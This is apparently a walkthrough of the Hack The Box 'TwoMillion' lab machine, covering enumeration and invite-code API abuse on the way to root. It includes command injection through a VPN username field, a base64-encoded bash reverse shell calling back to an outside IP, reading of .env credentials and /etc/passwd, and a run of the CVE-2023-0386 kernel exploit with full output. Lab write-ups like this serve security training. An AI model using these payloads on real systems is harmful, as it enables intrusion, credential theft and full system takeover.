## TwoMillion from HTB
- starting enum with nmap

# NMAP

```nmap
Nmap scan report for 10.129.1.210 (10.129.1.210)
Host is up (0.24s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 24.42 seconds
``` 

- now taking view of open ports there are 2 ports are open ssh and http.
- now starting to mine some directory for more intersting content 

# DIRSEARCH

```dirsearch
dirsearch -u http://2million.htb -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -o dir

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 220544
/usr/share/dirsearch/lib/core/fuzzer.py:300: SyntaxWarning: 'break' in a 'finally' block
  break

Target: http://2million.htb/

[13:05:31] Scanning: 
[13:05:33] 301 -   162B - /images  ->  http://2million.htb/images/
[13:05:33] 302 -     0B - /home  ->  /
[13:05:33] 200 -    4KB - /login
[13:05:33] 200 -    4KB - /register
[13:05:34] 301 -   162B - /assets  ->  http://2million.htb/assets/
[13:05:35] 301 -   162B - /css  ->  http://2million.htb/css/
[13:05:37] 301 -   162B - /js  ->  http://2million.htb/js/
[13:05:38] 401 -     0B - /api
[13:05:39] 302 -     0B - /logout  ->  /
[13:05:41] 200 -    2KB - /404
[13:05:47] 301 -   162B - /fonts  ->  http://2million.htb/fonts/
[13:05:48] 301 -   162B - /views  ->  http://2million.htb/views/
[13:05:56] 301 -   162B - /VPN  ->  http://2million.htb/VPN/
[13:06:12] 200 -    2KB - /0404
[13:06:15] 200 -    4KB - /invite
[13:10:50] 301 -   162B - /controllers  ->  http://2million.htb/controllers/

Task Completed

---

- we found the some directory and login, invite, etc. so now we see the source code of the website and the we find the next step. `inviteapi.min.js` 
```
eval(function(p,a,c,k,e,d){e=function(c){return
c.toString(36)};if(!''.replace(/^/,String)){while(c--)
{d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function()
{return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new
RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8=
{"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j()
{$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0)
{3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax
|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|g
enerate|verify'.split('|'),0,{}))
```
- There are two functions in the code above. The first one is similar to the one that we saw earlier in the invite page, that can be used to verify an invite code.
 The second one is a little more interesting, as it can make a POST request to /api/v1/invite/how/to/generate .
 This endpoint seems very interesting, so in order to access it we can either call this JavaScript function from our browser's console, or use cURL. 
 We will go with the latter.

```
curl -sX POST http://2million.htb/api/v1/invite/how/to/generate | jq
```
Note: We use the -s switch so that cURL won't show the connection progress. We also use jq to
beautify the outputted JSON

The output is in JSON format and contains some interesting data that seems encrypted. The encryption type
is hinted as being ROT13 which is basically a Caesars cipher. A hint is also visible that mentions we need to
identify the encryption type and decrypt it. The website rot13 can be used to decrypt the above data.
After pasting the encrypted data to the website we get the following message.

```In order to generate the invite code, make a POST request to /api/v1/invite/generate```

The message mentions that we can generate an invite code by making a POST request to
/api/v1/invite/generate . Let's do this as shown previously

```bash
curl -sX POST http://2million.htb/api/v1/invite/generate | jq
```

The output is similar to what we found above, but this time it seems to be encoded instead of encrypted
with what seems to be Base64. Let's decode the above Base64 in our terminal.

```
echo U1oyN0ktUTVaOVMtREtOSVgtUDNDU00= | base64 -d
SZ27I-Q5Z9S-DKNIX-P3CSM
```

The above appears like a valid invite code. Let's input it into the /invite page and click submit.
Indeed the above works and we are redirected to /register . The invite code is automatically transferred
to this page and filled in.
Let's register with the username test , email test@2million.htb and a random password of our choice.
After clicking register we are redirected to /login at which point we can use our newly created account to
login to the website.
After logging in we are redirected to /home .
The website features only a few pages that work, with the more interesting of those being the Access page.
The Access page allows a user to Download and Regenerate their VPN file to be able to access the HTB
infrastructure. Let's fire up BurpSuite and see what the Connection Pack download button does

```
GET /api/v1/user/vpn/generate HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://2million.htb/home/access
DNT: 1
Connection: close
Cookie: PHPSESSID=nufb0km8892s1t9kraqhqiecj6
Upgrade-Insecure-Requests: 1
```

Upon clicking on the button a GET request is sent out to /api/v1/users/vpn/generate and in return the
VPN file for our current user is downloaded.
Let's try requesting the URL /api to see if anything interesting is returned

```bash
curl -v 2million.htb/api
```

Note: The -v flag is used in cURL to see more details about the server response, such as the response
code.

It seems we get a status code of 401 Unauthorized . Let's try providing the website with our PHP session
cookie which we can grab either from our browser or from BurpSuite as seen previously.

```
curl -sv 2million.htb/api --cookie "PHPSESSID=nufb0km8892s1t9kraqhqiecj6" | jq
```

Now let's request /api/v1 to see if any endpoints are listed.

```
curl 2million.htb/api/v1 --cookie "PHPSESSID=nufb0km8892s1t9kraqhqiecj6" | jq
```
We get a list of quite a few endpoints that are available in the API, with some of the most interesting ones
being the admin specific endpoints. As a test we can hit the /admin/auth endpoint to check if we are an
admin user.

```
curl http://2million.htb/api/v1/admin/auth --cookie
"PHPSESSID=nufb0km8892s1t9kraqhqiecj6" | jq
```

As expected we are not currently an administrative user. Let's check out the /admin/vpn/generate
endpoint by switching our request to POST and including our cookie once more.

```
curl -sv -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie
"PHPSESSID=nufb0km8892s1t9kraqhqiecj6"
```
We get a 401 Unauthorised error, most probably because we are not an admin. Let's move to the final
administrative endpoint, /admin/settings/update . We note that this request needs to be a PUT as shown
in the output from /api/v1 .

```
curl -v -X PUT http://2million.htb/api/v1/admin/settings/update --cookie
"PHPSESSID=nufb0km8892s1t9kraqhqiecj6" | jq
```

Interestingly enough, this time we do not get an Unauthorized error, but instead the API replies with
Invalid content type . It is often for APIs to use JSON for sending and receiving data, and we already
know that the API replies in JSON, so lets set the Content-Type header to JSON and try again.

```
curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie
"PHPSESSID=nufb0km8892s1t9kraqhqiecj6" --header "Content-Type: application/json" | jq
```
We now get a new error message, specifically that there is a parameter missing called email . Let's supply
the email for our own user in JSON format.

```bash
curl -X PUT http://2million.htb/api/v1/admin/settings/update \
  --cookie "PHPSESSID=nufb0km8892s1t9kraqhqiecj6" \
  --header "Content-Type: application/json" \
  --data '{"email":"test@2million.htb"}' | jq
```

We get another error for a missing parameter called is_admin . Let's add this as well.

```bash
curl -X PUT http://2million.htb/api/v1/admin/settings/update \
  --cookie "PHPSESSID=nufb0km8892s1t9kraqhqiecj6" \
  --header "Content-Type: application/json" \
  --data '{"email":"test@2million.htb", "is_admin": true}' | jq
```

Since we set the parameter to true , an error message informs us that this variable needs a value of 0 or 1.
Let's set it to 1.

```bash
curl -X PUT http://2million.htb/api/v1/admin/settings/update \
  --cookie "PHPSESSID=nufb0km8892s1t9kraqhqiecj6" \
  --header "Content-Type: application/json" \
  --data '{"email":"test@2million.htb", "is_admin": 1}' | jq
```

The above command seems to have been successful as our user information is returned and the is_admin
variable is set to 1. We can further verify this by accessing the /admin/auth endpoint that we saw earlier.

```bash
curl http://2million.htb/api/v1/admin/auth \
  --cookie "PHPSESSID=nufb0km8892s1t9kraqhqiecj6" | jq
```
This time instead of an error we get the value true back indicating that we are indeed an admin now.

---

# Foothold

Let's check out the /admin/vpn/generate URL now that we have sufficient permissions.

```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
  --cookie "PHPSESSID=nufb0km8892s1t9kraqhqiecj6" \
  --header "Content-Type: application/json" | jq
```

The result informs us of a missing parameter called username . At this point we can infer that this is the
username of the user that the VPN will be generated for, so let's attempt to input a random username.

```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
  --cookie "PHPSESSID=nufb0km8892s1t9kraqhqiecj6" \
  --header "Content-Type: application/json" \
  --data '{"username":"test"}'
```

This returns a VPN configuration file:

```
client
dev tun
proto udp
remote edge-eu-release-1.hackthebox.eu 1337
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
comp-lzo
verb 3
data-ciphers-fallback AES-128-CBC
data-ciphers AES-256-CBC:AES-256-CFB:AES-256-CFB1:AES-256-CFB8:AES-256-OFB:AES-256-GCM
tls-cipher "DEFAULT:@SECLEVEL=0"
auth SHA256
key-direction 1
<ca>
-----BEGIN CERTIFICATE-----
MIIGADCCA+igAwIBAgIUQxzHkNyCAfHzUuoJgKZwCwVNjgIwDQYJKoZIhvcNAQEL
<SNIP>
```
After sending the above command we see that a VPN configuration file was generated for user test and
was printed out to us. If this VPN is being generated via the exec or system PHP function and there is
insufficient filtering in place - which is possible as this is an administrative only function - it might be
possible to inject malicious code in the username field and gain command execution on the remote system.
Let's test this assumption by injecting the command ;id; after the username.

```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
  --cookie "PHPSESSID=nufb0km8892s1t9kraqhqiecj6" \
  --header "Content-Type: application/json" \
  --data '{"username":"test;id;"}'

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The command is successful and we gain command execution. Let's start a Netcat listener to catch a shell.
```
nc -lvp 1234
```
We can then get a shell with the following payload.
```
bash -i >& /dev/tcp/10.10.14.4/1234 0>&1
```

We encode the payload in Base64 and add it to the following command.

```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
  --cookie "PHPSESSID=nufb0km8892s1t9kraqhqiecj6" \
  --header "Content-Type: application/json" \
  --data '{"username":"test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQo= | base64 -d | bash;"}'
```

---

# Lateral Movement

Enumeration of the web directory reveals a file called .env which contains database credentials for a user
called admin .

```
www-data@2million:/var/www/html$ cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```
The /etc/passwd file reveals that there is indeed a user on the system called admin .

```
cat /etc/passwd
<SNIP>
admin:x:1000:1000::/home/admin:/bin/bash
memcache:x:115:121:Memcached,,,:/nonexistent:/bin/false
```
Owed to password re-use we can login as admin over SSH with SuperDuperPass123.

```bash
ssh admin@2million.htb
```
The user flag can be found in /home/admin .

# Privilege Escalation

Enumeration of the current user's mails in /var/mail reveals a file called admin , which contains all the
emails for our current user. Let's read it.
The email originates from ch4p and is letting the admin know that he should perform updates on this
system as there have been some serious kernel exploits recently. More specifically an exploit for OverlayFS
/ FUSE is mentioned.
Let's perform a quick Google search with the keywords overlays fuse exploit . The results reveal this
article about an exploit which is assigned CVE-2023-0386, that exists in the Linux kernel. Some more
research reveals this post from Ubuntu that details the vulnerable kernel versions.
Enumeration of the current kernel version reveals that the box is using 5.15.70 .

```
admin@ubuntu:~$ uname -a
Linux ubuntu 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022
x86_64 x86_64 x86_64 GNU/Linux
```
We can also see that the box is currently on the Jammy release.

```
lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description: Ubuntu 22.04.2 LTS
Release: 22.04
Codename: jammy
```
The affected kernel versions for jammy go up to 5.15.0-70.77 and as seen previously the box is using
5.15.70 so it is a good idea to test if it is vulnerable. There are multiple exploits available online, one of
which is this one on GitHub.
Download the exploit locally by cloning the repository.
```
git clone https://github.com/xkaneiki/CVE-2023-0386
```
Compress the entire repository so that it is easier to upload.
```
zip -r cve.zip CVE-2023-0386
```
Then upload it using scp .
On the box, navigate to /tmp and unzip the contents of cve.zip .

```
scp cve.zip admin@2million.htb:/tmp
cd /tmp
unzip cve.zip
```
As per the instructions on the GitHub page, enter the CVE-2023-0386 directory and compile the code

```
cd /tmp/CVE-2023-0386/
make all
```
Note: The compilation throws a few warnings but these can be safely ignored.

Finally, let's run the exploit in two steps. We run the first command in the background.

```bash
./fuse ./ovlcap/lower ./gc &
```

Then we execute the exp binary in the foreground.

```bash
./exp
```

## Successful Exploitation

The session output below shows the successful exploitation:

```bash
ssh admin@$ip  
The authenticity of host '10.129.1.210 (10.129.1.210)' can't be established.
ED25519 key fingerprint is: SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.1.210' (ED25519) to the list of known hosts.
admin@10.129.1.210's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.70-051570-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Jun 11 02:14:39 PM UTC 2026

  System load:           0.0
  Usage of /:            87.8% of 4.82GB
  Memory usage:          16%
  Swap usage:            0%
  Processes:             229
  Users logged in:       0
  IPv4 address for eth0: 10.129.1.210
  IPv6 address for eth0: dead:beef::250:56ff:feb9:e655

  => / is using 87.8% of 4.82GB


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

You have mail.
Last login: Tue Jun  6 12:43:11 2023 from 10.10.14.6
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@2million:~$ ls
user.txt
admin@2million:~$ cat user.txt
dd785159b738f031764ba0f048590be6
admin@2million:~$ git clone https://github.com/xkaneiki/CVE-2023-0386
Cloning into 'CVE-2023-0386'...
^C
admin@2million:~$ cd /tmp
unzip cve.zip
Archive:  cve.zip
   creating: CVE-2023-0386/
   creating: CVE-2023-0386/.git/
   creating: CVE-2023-0386/.git/hooks/
  inflating: CVE-2023-0386/.git/hooks/applypatch-msg.sample  
  inflating: CVE-2023-0386/.git/hooks/commit-msg.sample  
  inflating: CVE-2023-0386/.git/hooks/fsmonitor-watchman.sample  
  inflating: CVE-2023-0386/.git/hooks/post-update.sample  
  inflating: CVE-2023-0386/.git/hooks/pre-applypatch.sample  
  inflating: CVE-2023-0386/.git/hooks/pre-commit.sample  
  inflating: CVE-2023-0386/.git/hooks/pre-merge-commit.sample  
  inflating: CVE-2023-0386/.git/hooks/pre-push.sample  
  inflating: CVE-2023-0386/.git/hooks/pre-rebase.sample  
  inflating: CVE-2023-0386/.git/hooks/pre-receive.sample  
  inflating: CVE-2023-0386/.git/hooks/prepare-commit-msg.sample  
  inflating: CVE-2023-0386/.git/hooks/push-to-checkout.sample  
  inflating: CVE-2023-0386/.git/hooks/sendemail-validate.sample  
  inflating: CVE-2023-0386/.git/hooks/update.sample  
   creating: CVE-2023-0386/.git/info/
  inflating: CVE-2023-0386/.git/info/exclude  
  inflating: CVE-2023-0386/.git/description  
   creating: CVE-2023-0386/.git/objects/
   creating: CVE-2023-0386/.git/objects/pack/
  inflating: CVE-2023-0386/.git/objects/pack/pack-fdcfb3c1c347e6514a19736a09517b8100eb5c49.pack  
  inflating: CVE-2023-0386/.git/objects/pack/pack-fdcfb3c1c347e6514a19736a09517b8100eb5c49.rev  
  inflating: CVE-2023-0386/.git/objects/pack/pack-fdcfb3c1c347e6514a19736a09517b8100eb5c49.idx  
   creating: CVE-2023-0386/.git/objects/info/
   creating: CVE-2023-0386/.git/refs/
   creating: CVE-2023-0386/.git/refs/heads/
 extracting: CVE-2023-0386/.git/refs/heads/main  
   creating: CVE-2023-0386/.git/refs/tags/
   creating: CVE-2023-0386/.git/refs/remotes/
   creating: CVE-2023-0386/.git/refs/remotes/origin/
 extracting: CVE-2023-0386/.git/refs/remotes/origin/HEAD  
  inflating: CVE-2023-0386/.git/packed-refs  
   creating: CVE-2023-0386/.git/logs/
   creating: CVE-2023-0386/.git/logs/refs/
   creating: CVE-2023-0386/.git/logs/refs/remotes/
   creating: CVE-2023-0386/.git/logs/refs/remotes/origin/
  inflating: CVE-2023-0386/.git/logs/refs/remotes/origin/HEAD  
   creating: CVE-2023-0386/.git/logs/refs/heads/
  inflating: CVE-2023-0386/.git/logs/refs/heads/main  
  inflating: CVE-2023-0386/.git/logs/HEAD  
 extracting: CVE-2023-0386/.git/HEAD  
  inflating: CVE-2023-0386/.git/config  
  inflating: CVE-2023-0386/.git/index  
  inflating: CVE-2023-0386/Makefile  
  inflating: CVE-2023-0386/README.md  
  inflating: CVE-2023-0386/exp.c     
  inflating: CVE-2023-0386/fuse.c    
  inflating: CVE-2023-0386/getshell.c  
   creating: CVE-2023-0386/ovlcap/
 extracting: CVE-2023-0386/ovlcap/.gitkeep  
   creating: CVE-2023-0386/test/
  inflating: CVE-2023-0386/test/fuse_test.c  
  inflating: CVE-2023-0386/test/mnt  
  inflating: CVE-2023-0386/test/mnt.c  
admin@2million:/tmp$ cd /tmp/CVE-2023-0386/
make all
gcc fuse.c -o fuse -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl
fuse.c: In function ‘read_buf_callback’:
fuse.c:106:21: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘off_t’ {aka ‘long int’} [-Wformat=]
  106 |     printf("offset %d\n", off);
      |                    ~^     ~~~
      |                     |     |
      |                     int   off_t {aka long int}
      |                    %ld
fuse.c:107:19: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘size_t’ {aka ‘long unsigned int’} [-Wformat=]
  107 |     printf("size %d\n", size);
      |                  ~^     ~~~~
      |                   |     |
      |                   int   size_t {aka long unsigned int}
      |                  %ld
fuse.c: In function ‘main’:
fuse.c:214:12: warning: implicit declaration of function ‘read’; did you mean ‘fread’? [-Wimplicit-function-declaration]
  214 |     while (read(fd, content + clen, 1) > 0)
      |            ^~~~
      |            fread
fuse.c:216:5: warning: implicit declaration of function ‘close’; did you mean ‘pclose’? [-Wimplicit-function-declaration]
  216 |     close(fd);
      |     ^~~~~
      |     pclose
fuse.c:221:5: warning: implicit declaration of function ‘rmdir’ [-Wimplicit-function-declaration]
  221 |     rmdir(mount_path);
      |     ^~~~~
/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/11/../../../x86_64-linux-gnu/libfuse.a(fuse.o): in function `fuse_new_common':
(.text+0xaf4e): warning: Using 'dlopen' in statically linked applications requires at runtime the shared libraries from the glibc version used for linking
gcc -o exp exp.c -lcap
gcc -o gc getshell.c
admin@2million:/tmp/CVE-2023-0386$ ./fuse ./ovlcap/lower ./gc &
[1] 57630
admin@2million:/tmp/CVE-2023-0386$ [+] len of gc: 0x3ee0
./exp
uid:1000 gid:1000
[+] mount success
[+] readdir
[+] getattr_callback
/file
total 8
drwxrwxr-x 1 root   root     4096 Jun 11 14:19 .
drwxr-xr-x 6 root   root     4096 Jun 11 14:19 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] open_callback
/file
[+] read buf callback
offset 0
size 16384
path /file
[+] open_callback
/file
[+] open_callback
/file
[+] ioctl callback
path /file
cmd 0x80086601
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@2million:/tmp/CVE-2023-0386# ls
exp  exp.c  fuse  fuse.c  gc  getshell.c  Makefile  ovlcap  README.md  test
root@2million:/tmp/CVE-2023-0386# cd /root
root@2million:/root# ls
root.txt  snap  thank_you.json
root@2million:/root# cat root.txt
cc138a73bd0bee437497c6aa1e687327
root@2million:/root# 


```

